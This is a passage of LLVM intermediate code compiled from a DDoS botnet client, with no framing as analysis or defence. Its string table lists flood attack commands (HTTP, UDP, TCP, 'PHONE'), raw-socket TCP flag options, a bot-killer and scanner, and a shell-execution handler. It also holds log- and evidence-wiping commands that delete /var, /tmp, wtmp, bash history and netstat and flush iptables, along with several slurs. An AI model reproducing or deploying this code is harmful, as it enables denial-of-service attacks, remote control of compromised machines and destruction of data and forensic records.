@.str.406 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.407 = private unnamed_addr constant [6 x i8] c"hackz\00", align 1
@.str.408 = private unnamed_addr constant [7 x i8] c"shdyed\00", align 1
@.str.409 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.410 = private unnamed_addr constant [10 x i8] c"sghwiondc\00", align 1
@.str.411 = private unnamed_addr constant [7 x i8] c"nigger\00", align 1
@.str.412 = private unnamed_addr constant [6 x i8] c"pussy\00", align 1
@.str.413 = private unnamed_addr constant [7 x i8] c"faggot\00", align 1
@.str.414 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.415 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.416 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.417 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.418 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.419 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.420 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.421 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.422 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.423 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.458 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.459 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.460 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.461 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.462 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.463 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.464 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.465 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.466 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.467 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.468 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.469 = private unnamed_addr constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00", align 1
@.str.470 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.471 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.472 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.473 = private unnamed_addr constant [8 x i8] c"BOTKILL\00", align 1
@.str.474 = private unnamed_addr constant [27 x i8] c"[BOTKILLER] [STARTED] [%s]\00", align 1
@.str.475 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.476 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.477 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.478 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.479 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.480 = private unnamed_addr constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00", align 1
@.str.481 = private unnamed_addr constant [6 x i8] c"PHONE\00", align 1
@.str.482 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.483 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.484 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.485 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.486 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.487 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.488 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.489 = private unnamed_addr constant [6 x i8] c"HITTA\00", align 1
@.str.490 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.491 = private unnamed_addr constant [23 x i8] c"[CONNECTED] [%s] [%s]\0A\00", align 1
@.str.492 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.493 = private unnamed_addr constant [29 x i8] c"\1B[0;32m[CONNECTED] [%s] [%s]\00", align 1
@.str.494 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.495 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.496 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.497 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.498 = private unnamed_addr constant [2 x i8] c" \00", align 1
@ipState.2 = internal unnamed_addr global i8 0, align 1
@ipState.3 = internal unnamed_addr global i8 0, align 1
@str = private unnamed_addr constant [18 x i8] c"BYE MISTER HITTA!\00"

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
min.iters.checked:
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %1 = add i32 %0, -1640531527
  store i32 %1, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %2 = add i32 %0, 1013904242
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  %vector.recur.init = insertelement <2 x i32> undef, i32 %0, i32 1
  %load_initial = load <2 x i32>, <2 x i32>* bitcast (i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1) to <2 x i32>*), align 4
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %store_forwarded = phi <2 x i32> [ %load_initial, %min.iters.checked ], [ %16, %vector.body ]
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body ]
  %vector.recur = phi <2 x i32> [ %vector.recur.init, %min.iters.checked ], [ %8, %vector.body ]
  %vec.ind = phi <2 x i64> [ <i64 3, i64 4>, %min.iters.checked ], [ %vec.ind.next.1, %vector.body ]
  %3 = or i64 %index, 3
  %4 = shufflevector <2 x i32> %vector.recur, <2 x i32> %store_forwarded, <2 x i32> <i32 1, i32 2>
  %5 = trunc <2 x i64> %vec.ind to <2 x i32>
  %6 = xor <2 x i32> %5, <i32 -1640531527, i32 -1640531527>
  %7 = xor <2 x i32> %6, %4
  %8 = xor <2 x i32> %7, %store_forwarded
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %3
  %10 = bitcast i32* %9 to <2 x i32>*
  store <2 x i32> %8, <2 x i32>* %10, align 4
  %vec.ind.next = add <2 x i64> %vec.ind, <i64 2, i64 2>
  %11 = add nsw i64 %index, 5
  %12 = shufflevector <2 x i32> %store_forwarded, <2 x i32> %8, <2 x i32> <i32 1, i32 2>
  %13 = trunc <2 x i64> %vec.ind.next to <2 x i32>
  %14 = xor <2 x i32> %13, <i32 -1640531527, i32 -1640531527>
  %15 = xor <2 x i32> %14, %12
  %16 = xor <2 x i32> %15, %8
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %11
  %18 = bitcast i32* %17 to <2 x i32>*
  store <2 x i32> %16, <2 x i32>* %18, align 4
  %index.next.1 = add nsw i64 %index, 4
  %vec.ind.next.1 = add <2 x i64> %vec.ind, <i64 4, i64 4>
  %19 = icmp eq i64 %index.next.1, 4092
  br i1 %19, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  br label %._crit_edge

._crit_edge:                                      ; preds = %middle.block
  %vector.recur.extract = extractelement <2 x i32> %8, i32 1
  %20 = load i32, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4093), align 4
  %21 = xor i32 %vector.recur.extract, -1640532410
  %22 = xor i32 %21, %20
  store i32 %22, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4095), align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  store i32 %18, i32* %5, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #15
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #15
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %80
  %.0.lcssa.ph = phi i32 [ %79, %.lr.ph22 ], [ %81, %80 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %17 = sext i32 %.0.lcssa to i64
  %18 = icmp sgt i64 %17, %16
  %smax = select i1 %18, i64 %17, i64 %16
  %19 = add nsw i64 %smax, 1
  %20 = sub nsw i64 %19, %16
  %min.iters.check = icmp ult i64 %20, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %16, %vector.memcheck ], [ %16, %min.iters.checked ], [ %16, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %20, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %21 = icmp sgt i64 %17, %16
  %smax34 = select i1 %21, i64 %17, i64 %16
  %22 = add nsw i64 %smax34, 1
  %23 = sub nsw i64 %22, %16
  %scevgep = getelementptr i8, i8* %0, i64 %23
  %scevgep35 = getelementptr i8, i8* %0, i64 %16
  %scevgep36 = getelementptr i8, i8* %0, i64 %22
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %16, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %24 = add nsw i64 %n.vec, -32
  %25 = lshr exact i64 %24, 5
  %26 = add nuw nsw i64 %25, 1
  %xtraiter = and i64 %26, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %27 = add i64 %16, %index.prol
  %28 = getelementptr inbounds i8, i8* %0, i64 %27
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !4
  %30 = getelementptr i8, i8* %28, i64 16
  %31 = bitcast i8* %30 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %31, align 1, !alias.scope !4
  %32 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %33 = bitcast i8* %32 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %33, align 1, !alias.scope !7, !noalias !4
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %35, align 1, !alias.scope !7, !noalias !4
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !9

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %36 = icmp ult i64 %24, 96
  br i1 %36, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %37 = add i64 %16, %index
  %38 = getelementptr inbounds i8, i8* %0, i64 %37
  %39 = bitcast i8* %38 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !4
  %40 = getelementptr i8, i8* %38, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !4
  %42 = getelementptr inbounds i8, i8* %0, i64 %index
  %43 = bitcast i8* %42 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %43, align 1, !alias.scope !7, !noalias !4
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %45, align 1, !alias.scope !7, !noalias !4
  %index.next = add i64 %index, 32
  %46 = add i64 %16, %index.next
  %47 = getelementptr inbounds i8, i8* %0, i64 %46
  %48 = bitcast i8* %47 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %48, align 1, !alias.scope !4
  %49 = getelementptr i8, i8* %47, i64 16
  %50 = bitcast i8* %49 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %50, align 1, !alias.scope !4
  %51 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %52 = bitcast i8* %51 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %52, align 1, !alias.scope !7, !noalias !4
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %54, align 1, !alias.scope !7, !noalias !4
  %index.next.1 = add i64 %index, 64
  %55 = add i64 %16, %index.next.1
  %56 = getelementptr inbounds i8, i8* %0, i64 %55
  %57 = bitcast i8* %56 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %57, align 1, !alias.scope !4
  %58 = getelementptr i8, i8* %56, i64 16
  %59 = bitcast i8* %58 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %59, align 1, !alias.scope !4
  %60 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %61 = bitcast i8* %60 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %61, align 1, !alias.scope !7, !noalias !4
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %63, align 1, !alias.scope !7, !noalias !4
  %index.next.2 = add i64 %index, 96
  %64 = add i64 %16, %index.next.2
  %65 = getelementptr inbounds i8, i8* %0, i64 %64
  %66 = bitcast i8* %65 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %66, align 1, !alias.scope !4
  %67 = getelementptr i8, i8* %65, i64 16
  %68 = bitcast i8* %67 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %68, align 1, !alias.scope !4
  %69 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %70 = bitcast i8* %69 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %70, align 1, !alias.scope !7, !noalias !4
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %72, align 1, !alias.scope !7, !noalias !4
  %index.next.3 = add i64 %index, 128
  %73 = icmp eq i64 %index.next.3, %n.vec
  br i1 %73, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !11

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %20, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %80
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %80 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %81, %80 ]
  %74 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = tail call i32 @isspace(i32 %76) #15
  %78 = icmp eq i32 %77, 0
  %79 = trunc i64 %indvars.iv27 to i32
  br i1 %78, label %.critedge.preheader.loopexit, label %80

; <label>:80:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %81 = add nsw i32 %.021, -1
  %82 = icmp sgt i64 %indvars.iv27, %14
  br i1 %82, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %83 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %84 = load i8, i8* %83, align 1
  %85 = sub nsw i64 %indvars.iv, %16
  %86 = getelementptr inbounds i8, i8* %0, i64 %85
  store i8 %84, i8* %86, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %87 = icmp slt i64 %indvars.iv, %17
  br i1 %87, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !12

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %88 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %88, 32
  %89 = ashr exact i64 %sext33, 32
  %90 = getelementptr inbounds i8, i8* %0, i64 %89
  store i8 0, i8* %90, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @filter(i8* nocapture) local_unnamed_addr #1 {
  br label %2

; <label>:2:                                      ; preds = %.critedge, %1
  %3 = tail call i64 @strlen(i8* %0) #15
  %4 = add i64 %3, -1
  %5 = getelementptr inbounds i8, i8* %0, i64 %4
  %6 = load i8, i8* %5, align 1
  switch i8 %6, label %10 [
    i8 13, label %.critedge
    i8 10, label %.critedge
  ]

.critedge:                                        ; preds = %2, %2
  %7 = tail call i64 @strlen(i8* nonnull %0) #15
  %8 = add i64 %7, -1
  %9 = getelementptr inbounds i8, i8* %0, i64 %8
  store i8 0, i8* %9, align 1
  br label %2

; <label>:10:                                     ; preds = %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define noalias i8* @makestring() local_unnamed_addr #1 {
  %1 = alloca [1024 x i8], align 16
  %2 = tail call i32 @rand() #5
  %3 = srem i32 %2, 5
  %4 = add nsw i32 %3, 4
  %5 = add nsw i32 %3, 5
  %6 = sext i32 %5 to i64
  %7 = tail call noalias i8* @malloc(i64 %6) #5
  tail call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 %6, i32 1, i1 false)
  %8 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.32, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i64 0, i64 0))
  %9 = icmp eq %struct._IO_FILE* %8, null
  br i1 %9, label %.preheader, label %18

.preheader:                                       ; preds = %0
  %10 = icmp sgt i32 %3, -4
  br i1 %10, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  %11 = sext i32 %4 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %12 = tail call i32 @rand() #5
  %13 = srem i32 %12, 26
  %14 = add nsw i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = getelementptr inbounds i8, i8* %7, i64 %indvars.iv
  store i8 %15, i8* %16, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %17 = icmp slt i64 %indvars.iv.next, %11
  br i1 %17, label %.lr.ph, label %.loopexit.loopexit

; <label>:18:                                     ; preds = %0
  %19 = tail call i32 @rand() #5
  %20 = tail call i32 @rand() #5
  %21 = mul nsw i32 %20, %19
  %22 = srem i32 %21, 45402
  %23 = icmp slt i32 %22, 0
  %24 = getelementptr inbounds [1024 x i8], [1024 x i8]* %1, i64 0, i64 0
  br i1 %23, label %._crit_edge, label %.lr.ph18.preheader

.lr.ph18.preheader:                               ; preds = %18
  br label %.lr.ph18

.lr.ph18:                                         ; preds = %.lr.ph18.preheader, %.lr.ph18
  %.117 = phi i32 [ %26, %.lr.ph18 ], [ 0, %.lr.ph18.preheader ]
  %25 = call i8* @fgets(i8* nonnull %24, i32 1024, %struct._IO_FILE* nonnull %8)
  %26 = add nuw nsw i32 %.117, 1
  %exitcond = icmp eq i32 %.117, %22
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph18

._crit_edge.loopexit:                             ; preds = %.lr.ph18
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 1024, i32 16, i1 false)
  %27 = call i8* @fgets(i8* nonnull %24, i32 1024, %struct._IO_FILE* nonnull %8)
  call void @filter(i8* nonnull %24)
  %28 = sext i32 %4 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %7, i8* nonnull %24, i64 %28, i32 1, i1 false)
  %29 = call i32 @fclose(%struct._IO_FILE* nonnull %8)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %._crit_edge
  ret i8* %7
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @fgets(i8*, i32, %struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %9 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  br label %10

; <label>:10:                                     ; preds = %138, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %138 ]
  %.0 = phi i8* [ %1, %3 ], [ %139, %138 ]
  %11 = load i8, i8* %.0, align 1
  switch i8 %11, label %134 [
    i8 0, label %140
    i8 37, label %12
  ]

; <label>:12:                                     ; preds = %10
  %13 = getelementptr inbounds i8, i8* %.0, i64 1
  %14 = load i8, i8* %13, align 1
  switch i8 %14, label %.preheader70 [
    i8 0, label %140
    i8 37, label %134
    i8 45, label %15
  ]

; <label>:15:                                     ; preds = %12
  %16 = getelementptr inbounds i8, i8* %.0, i64 2
  %.pre = load i8, i8* %16, align 1
  br label %.preheader70

.preheader70:                                     ; preds = %15, %12
  %17 = phi i8 [ %14, %12 ], [ %.pre, %15 ]
  %.063.ph = phi i32 [ 0, %12 ], [ 1, %15 ]
  %.1.ph = phi i8* [ %13, %12 ], [ %16, %15 ]
  %18 = icmp eq i8 %17, 48
  br i1 %18, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %19 = phi i8 [ %17, %.preheader70 ], [ %23, %.preheader.loopexit ]
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %22, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %21, %.preheader.loopexit ]
  %.off74 = add i8 %19, -48
  %20 = icmp ult i8 %.off74, 10
  br i1 %20, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %21, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %22, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %21 = getelementptr inbounds i8, i8* %.172, i64 1
  %22 = or i32 %.06371, 2
  %23 = load i8, i8* %21, align 1
  %24 = icmp eq i8 %23, 48
  br i1 %24, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %25 = phi i8 [ %31, %.lr.ph77 ], [ %19, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %30, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %29, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %26 = zext i8 %25 to i32
  %27 = mul nsw i32 %.06475, 10
  %28 = add i32 %27, -48
  %29 = add i32 %28, %26
  %30 = getelementptr inbounds i8, i8* %.276, i64 1
  %31 = load i8, i8* %30, align 1
  %.off = add i8 %31, -48
  %32 = icmp ult i8 %.off, 10
  br i1 %32, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

